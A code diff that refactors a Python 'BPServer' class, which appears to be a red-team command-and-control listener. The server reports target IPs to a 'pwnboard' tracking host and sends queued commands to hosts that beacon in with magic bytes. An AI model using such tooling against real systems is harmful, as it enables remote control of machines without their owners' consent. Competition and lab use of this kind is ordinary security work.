@@ -29,13 +29,8 @@ class BPServer(Thread):
         self.time_to_wait = 120
         self.time_waiting = datetime.datetime.now()
 
-    # def add_to_execution(self, task):
-    #     self.execution_queue.put(task)
-    #
-    # def add_to_push(self, task):
-    #     self.push_queue.put(task)
-
-    def sendUpdate(self, ip, name="BP"):
+    @staticmethod
+    def send_update(ip, name="BP"):
         host = "http://pwnboard.win/generic"
         d = {'ip': ip, 'type': name}
         try:
@@ -88,7 +83,7 @@ class BPServer(Thread):
             if MAGIC_BYTES in data[0:4] and REQUEST_BYTE == data[4:5]:
                 try:
                     cur_target = socket.inet_ntoa(struct.pack('!L', int.from_bytes(data[10:14], byteorder='big')))
-                    self.sendUpdate(cur_target)
+                    self.send_update(cur_target)
                     for cmd in target_cmds[cur_target]:
                         cmd = bytes(cmd, 'utf-8')
                         length = len(cmd).to_bytes(2, byteorder='big')
